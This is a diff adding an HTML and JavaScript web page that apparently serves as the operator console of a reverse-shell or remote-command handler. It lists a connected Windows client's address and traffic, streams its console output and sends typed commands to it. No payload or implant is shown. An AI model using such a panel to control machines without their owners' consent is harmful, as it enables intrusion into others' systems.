@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Client: {{ client_id }}</title>
+  <style>
+    body, html { margin:0; padding:0; height:100%; background:#1a1a1a; color:#e0e0e0; font-family: Arial, sans-serif; display: flex; flex-direction: column; }
+    header { background: #000; color: #0f0; padding: 1rem; font-family: monospace; display: flex; justify-content: space-between; align-items: center; }
+    header button { background: #242424; border: 1px solid #0f0; color: #0f0; padding: 0.5rem 1rem; font-family: monospace; cursor: pointer; border-radius: 4px; }
+    header button:hover { background: #0f0; color: #000; }
+    #info { padding: 0 1rem; background: #242424; }
+    #console { flex: 1; padding:1rem; overflow-y:auto; white-space:pre-wrap; background:#111; color:#0f0; font-family: monospace; }
+    #input { width:100%; box-sizing:border-box; padding:0.75rem; border:none; background:#222; color:#0f0; font-family:monospace; }
+  </style>
+</head>
+<body>
+  <header>
+    <div>Client: {{ client_id }}</div>
+    <button onclick="window.location='/'">&larr; Dashboard</button>
+  </header>
+  <div id="info">
+    <p><strong>Address:</strong> <span id="addr"></span></p>
+    <p><strong>Connected At:</strong> <span id="connected_at"></span></p>
+    <p><strong>Last Seen:</strong> <span id="last_seen"></span></p>
+    <p><strong>Bytes Received:</strong> <span id="bytes_received"></span></p>
+  </div>
+  <div id="console"></div>
+  <input id="input" placeholder="C:\\>" autofocus autocomplete="off" />
+  <script>
+    const clientId = '{{ client_id }}';
+    let currentPrompt = 'C:\\>';
+    const consoleDiv = document.getElementById('console');
+    const input = document.getElementById('input');
+
+    function updateInfo() {
+      fetch('/clients')
+        .then(res => res.json())
+        .then(list => {
+          const c = list.find(x => x.id === clientId);
+          if (c) {
+            document.getElementById('addr').textContent = c.addr;
+            document.getElementById('connected_at').textContent = c.connected_at;
+            document.getElementById('last_seen').textContent = c.last_seen;
+            document.getElementById('bytes_received').textContent = c.bytes_received;
+          }
+        });
+    }
+
+    setInterval(updateInfo, 2000);
+    updateInfo();
+
+    const eventSource = new EventSource(`/client/${clientId}/stream`);
+    eventSource.onmessage = e => {
+      const chunk = e.data.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
+      const lines = chunk.split('\n');
+
+      lines.forEach(rawLine => {
+        if (rawLine === '') {
+          consoleDiv.textContent += '\n';
+          return;
+        }
+        const line = rawLine.trim();
+        if (/^[A-Z]:\\.*>$/.test(line)) {
+          currentPrompt = line;
+          input.placeholder = currentPrompt;
+        } else {
+          consoleDiv.textContent += rawLine + '\n';
+          consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+      });
+    };
+
+    eventSource.addEventListener('close', () => {
+      consoleDiv.textContent += '\n[Disconnected]\n';
+      eventSource.close();
+    });
+
+    input.addEventListener('keydown', async e => {
+      if (e.key === 'Enter' && input.value) {
+        const cmd = input.value;
+        consoleDiv.textContent += `${currentPrompt}${cmd}\n\n`;
+        await fetch(`/client/${clientId}/cmd`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cmd })
+        });
+        input.value = '';
+      }
+    });
+  </script>
+</body>
+</html>
